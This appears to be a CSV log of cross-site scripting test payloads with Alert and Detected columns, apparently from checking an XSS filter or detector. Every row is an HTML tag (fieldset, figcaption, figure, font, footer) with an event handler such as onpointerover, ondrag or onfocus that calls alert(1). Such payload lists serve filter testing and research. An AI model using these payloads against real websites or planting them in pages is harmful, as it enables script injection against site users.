Payload,Alert,Detected
<fieldset onpointerenter=alert(1) style=display:block>XSS</fieldset>,False,1
<fieldset onpointerleave=alert(1) style=display:block>XSS</fieldset>,False,1
<fieldset onpointermove=alert(1) style=display:block>XSS</fieldset>,False,1
<fieldset onpointerout=alert(1) style=display:block>XSS</fieldset>,False,1
<fieldset onpointerover=alert(1) style=display:block>XSS</fieldset>,False,1
<fieldset onpointerrawupdate=alert(1) style=display:block>XSS</fieldset>,False,1
<fieldset onpointerup=alert(1) style=display:block>XSS</fieldset>,False,1
"<fieldset onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></fieldset>",False,1
<fieldset onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></fieldset>,False,1
<fieldset onwebkitmouseforcechanged=alert(1)>XSS</fieldset>,False,1
<fieldset onwebkitmouseforcedown=alert(1)>XSS</fieldset>,False,1
<fieldset onwebkitmouseforceup=alert(1)>XSS</fieldset>,False,1
<fieldset onwebkitmouseforcewillbegin=alert(1)>XSS</fieldset>,False,1
<fieldset onwebkitwillrevealbottom=alert(1)>XSS</fieldset>,False,1
<figcaption contenteditable onbeforeinput=alert(1)>test,False,1
"<figcaption draggable=""true"" ondrag=""alert(1)"" style=display:block>test</figcaption>",False,1
"<figcaption draggable=""true"" ondragend=""alert(1)"" style=display:block>test</figcaption>",False,1
"<figcaption draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</figcaption>",False,1
"<figcaption draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</figcaption>",False,1
"<figcaption draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</figcaption>",False,1
"<figcaption draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</figcaption>",False,1
"<figcaption id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></figcaption>",False,1
<figcaption id=x tabindex=1 onfocus=alert(1)></figcaption>,False,1
<figcaption id=x tabindex=1 onfocusin=alert(1)></figcaption>,False,1
<figcaption onafterscriptexecute=alert(1)><script>1</script>,False,1
"<figcaption onbeforecopy=""alert(1)"" contenteditable>test</figcaption>",False,1
"<figcaption onbeforecut=""alert(1)"" contenteditable>test</figcaption>",False,1
<figcaption onbeforescriptexecute=alert(1)><script>1</script>,False,1
<figcaption onblur=alert(1) id=x tabindex=1 style=display:block>test</figcaption><input value=clickme>,False,1
"<figcaption onclick=""alert(1)"" style=display:block>test</figcaption>",False,1
<figcaption oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<figcaption oncontextmenu=""alert(1)"" style=display:block>test</figcaption>",False,1
"<figcaption oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<figcaption oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<figcaption ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</figcaption>",False,1
<figcaption onfocus=alert(1) autofocus tabindex=1>,False,1
<figcaption onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</figcaption><input value=clickme>,False,1
"<figcaption onkeydown=""alert(1)"" contenteditable style=display:block>test</figcaption>",False,1
"<figcaption onkeypress=""alert(1)"" contenteditable style=display:block>test</figcaption>",False,1
"<figcaption onkeyup=""alert(1)"" contenteditable style=display:block>test</figcaption>",False,1
"<figcaption onmousedown=""alert(1)"" style=display:block>test</figcaption>",False,1
"<figcaption onmouseenter=""alert(1)"" style=display:block>test</figcaption>",False,1
"<figcaption onmouseleave=""alert(1)"" style=display:block>test</figcaption>",False,1
"<figcaption onmousemove=""alert(1)"" style=display:block>test</figcaption>",False,1
"<figcaption onmouseout=""alert(1)"" style=display:block>test</figcaption>",False,1
"<figcaption onmouseover=""alert(1)"" style=display:block>test</figcaption>",False,1
"<figcaption onmouseup=""alert(1)"" style=display:block>test</figcaption>",False,1
<figcaption onmousewheel=alert(1) style=display:block>requires scrolling,False,1
"<figcaption onpaste=""alert(1)"" contenteditable>test</figcaption>",False,1
<figcaption onpointercancel=alert(1)>XSS</figcaption>,False,1
<figcaption onpointerdown=alert(1) style=display:block>XSS</figcaption>,False,1
<figcaption onpointerenter=alert(1) style=display:block>XSS</figcaption>,False,1
<figcaption onpointerleave=alert(1) style=display:block>XSS</figcaption>,False,1
<figcaption onpointermove=alert(1) style=display:block>XSS</figcaption>,False,1
<figcaption onpointerout=alert(1) style=display:block>XSS</figcaption>,False,1
<figcaption onpointerover=alert(1) style=display:block>XSS</figcaption>,False,1
<figcaption onpointerrawupdate=alert(1) style=display:block>XSS</figcaption>,False,1
<figcaption onpointerup=alert(1) style=display:block>XSS</figcaption>,False,1
"<figcaption onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></figcaption>",False,1
<figcaption onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></figcaption>,False,1
<figcaption onwebkitmouseforcechanged=alert(1)>XSS</figcaption>,False,1
<figcaption onwebkitmouseforcedown=alert(1)>XSS</figcaption>,False,1
<figcaption onwebkitmouseforceup=alert(1)>XSS</figcaption>,False,1
<figcaption onwebkitmouseforcewillbegin=alert(1)>XSS</figcaption>,False,1
<figcaption onwebkitwillrevealbottom=alert(1)>XSS</figcaption>,False,1
<figure contenteditable onbeforeinput=alert(1)>test,False,1
"<figure draggable=""true"" ondrag=""alert(1)"" style=display:block>test</figure>",False,1
"<figure draggable=""true"" ondragend=""alert(1)"" style=display:block>test</figure>",False,1
"<figure draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</figure>",False,1
"<figure draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</figure>",False,1
"<figure draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</figure>",False,1
"<figure draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</figure>",False,1
"<figure id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></figure>",False,1
<figure id=x tabindex=1 onfocus=alert(1)></figure>,False,1
<figure id=x tabindex=1 onfocusin=alert(1)></figure>,False,1
<figure onafterscriptexecute=alert(1)><script>1</script>,False,1
"<figure onbeforecopy=""alert(1)"" contenteditable>test</figure>",False,1
"<figure onbeforecut=""alert(1)"" contenteditable>test</figure>",False,1
<figure onbeforescriptexecute=alert(1)><script>1</script>,False,1
<figure onblur=alert(1) id=x tabindex=1 style=display:block>test</figure><input value=clickme>,False,1
"<figure onclick=""alert(1)"" style=display:block>test</figure>",False,1
<figure oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<figure oncontextmenu=""alert(1)"" style=display:block>test</figure>",False,1
"<figure oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<figure oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<figure ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</figure>",False,1
<figure onfocus=alert(1) autofocus tabindex=1>,False,1
<figure onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</figure><input value=clickme>,False,1
"<figure onkeydown=""alert(1)"" contenteditable style=display:block>test</figure>",False,1
"<figure onkeypress=""alert(1)"" contenteditable style=display:block>test</figure>",False,1
"<figure onkeyup=""alert(1)"" contenteditable style=display:block>test</figure>",False,1
"<figure onmousedown=""alert(1)"" style=display:block>test</figure>",False,1
"<figure onmouseenter=""alert(1)"" style=display:block>test</figure>",False,1
"<figure onmouseleave=""alert(1)"" style=display:block>test</figure>",False,1
"<figure onmousemove=""alert(1)"" style=display:block>test</figure>",False,1
"<figure onmouseout=""alert(1)"" style=display:block>test</figure>",False,1
"<figure onmouseover=""alert(1)"" style=display:block>test</figure>",False,1
"<figure onmouseup=""alert(1)"" style=display:block>test</figure>",False,1
<figure onmousewheel=alert(1) style=display:block>requires scrolling,False,1
"<figure onpaste=""alert(1)"" contenteditable>test</figure>",False,1
<figure onpointercancel=alert(1)>XSS</figure>,False,1
<figure onpointerdown=alert(1) style=display:block>XSS</figure>,False,1
<figure onpointerenter=alert(1) style=display:block>XSS</figure>,False,1
<figure onpointerleave=alert(1) style=display:block>XSS</figure>,False,1
<figure onpointermove=alert(1) style=display:block>XSS</figure>,False,1
<figure onpointerout=alert(1) style=display:block>XSS</figure>,False,1
<figure onpointerover=alert(1) style=display:block>XSS</figure>,False,1
<figure onpointerrawupdate=alert(1) style=display:block>XSS</figure>,False,1
<figure onpointerup=alert(1) style=display:block>XSS</figure>,False,1
"<figure onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></figure>",False,1
<figure onwebkitmouseforcechanged=alert(1)>XSS</figure>,False,1
<figure onwebkitmouseforcedown=alert(1)>XSS</figure>,False,1
<figure onwebkitmouseforceup=alert(1)>XSS</figure>,False,1
<figure onwebkitmouseforcewillbegin=alert(1)>XSS</figure>,False,1
<figure onwebkitwillrevealbottom=alert(1)>XSS</figure>,False,1
<font contenteditable onbeforeinput=alert(1)>test,False,1
"<font draggable=""true"" ondrag=""alert(1)"" style=display:block>test</font>",False,1
"<font draggable=""true"" ondragend=""alert(1)"" style=display:block>test</font>",False,1
"<font draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</font>",False,1
"<font draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</font>",False,1
"<font draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</font>",False,1
"<font draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</font>",False,1
"<font id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></font>",False,1
<font id=x tabindex=1 onfocus=alert(1)></font>,False,1
<font id=x tabindex=1 onfocusin=alert(1)></font>,False,1
<font onafterscriptexecute=alert(1)><script>1</script>,False,1
"<font onbeforecopy=""alert(1)"" contenteditable>test</font>",False,1
"<font onbeforecut=""alert(1)"" contenteditable>test</font>",False,1
<font onbeforescriptexecute=alert(1)><script>1</script>,False,1
<font onblur=alert(1) id=x tabindex=1 style=display:block>test</font><input value=clickme>,False,1
"<font onclick=""alert(1)"" style=display:block>test</font>",False,1
<font oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<font oncontextmenu=""alert(1)"" style=display:block>test</font>",False,1
"<font oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<font oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<font ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</font>",False,1
<font onfocus=alert(1) autofocus tabindex=1>,False,1
<font onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</font><input value=clickme>,False,1
"<font onkeydown=""alert(1)"" contenteditable style=display:block>test</font>",False,1
"<font onkeypress=""alert(1)"" contenteditable style=display:block>test</font>",False,1
"<font onkeyup=""alert(1)"" contenteditable style=display:block>test</font>",False,1
"<font onmousedown=""alert(1)"" style=display:block>test</font>",False,1
"<font onmouseenter=""alert(1)"" style=display:block>test</font>",False,1
"<font onmouseleave=""alert(1)"" style=display:block>test</font>",False,1
"<font onmousemove=""alert(1)"" style=display:block>test</font>",False,1
"<font onmouseout=""alert(1)"" style=display:block>test</font>",False,1
"<font onmouseover=""alert(1)"" style=display:block>test</font>",False,1
"<font onmouseup=""alert(1)"" style=display:block>test</font>",False,1
<font onmousewheel=alert(1) style=display:block>requires scrolling,False,1
"<font onpaste=""alert(1)"" contenteditable>test</font>",False,1
<font onpointercancel=alert(1)>XSS</font>,False,1
<font onpointerdown=alert(1) style=display:block>XSS</font>,False,1
<font onpointerenter=alert(1) style=display:block>XSS</font>,False,1
<font onpointerleave=alert(1) style=display:block>XSS</font>,False,1
<font onpointermove=alert(1) style=display:block>XSS</font>,False,1
<font onpointerout=alert(1) style=display:block>XSS</font>,False,1
<font onpointerover=alert(1) style=display:block>XSS</font>,False,1
<font onpointerrawupdate=alert(1) style=display:block>XSS</font>,False,1
<font onpointerup=alert(1) style=display:block>XSS</font>,False,1
"<font onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></font>",False,1
<font onwebkitmouseforcechanged=alert(1)>XSS</font>,False,1
<font onwebkitmouseforcedown=alert(1)>XSS</font>,False,1
<font onwebkitmouseforceup=alert(1)>XSS</font>,False,1
<font onwebkitmouseforcewillbegin=alert(1)>XSS</font>,False,1
<font onwebkitwillrevealbottom=alert(1)>XSS</font>,False,1
<footer contenteditable onbeforeinput=alert(1)>test,False,1
"<footer draggable=""true"" ondrag=""alert(1)"" style=display:block>test</footer>",False,1
"<footer draggable=""true"" ondragend=""alert(1)"" style=display:block>test</footer>",False,1
"<footer draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</footer>",False,1
"<footer draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</footer>",False,1
"<footer draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</footer>",False,1
"<footer draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</footer>",False,1
"<footer id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></footer>",False,1
<footer id=x tabindex=1 onfocus=alert(1)></footer>,False,1
<footer id=x tabindex=1 onfocusin=alert(1)></footer>,False,1
<footer onafterscriptexecute=alert(1)><script>1</script>,False,1
"<footer onbeforecopy=""alert(1)"" contenteditable>test</footer>",False,1
"<footer onbeforecut=""alert(1)"" contenteditable>test</footer>",False,1
<footer onbeforescriptexecute=alert(1)><script>1</script>,False,1
<footer onblur=alert(1) id=x tabindex=1 style=display:block>test</footer><input value=clickme>,False,1
"<footer onclick=""alert(1)"" style=display:block>test</footer>",False,1
<footer oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
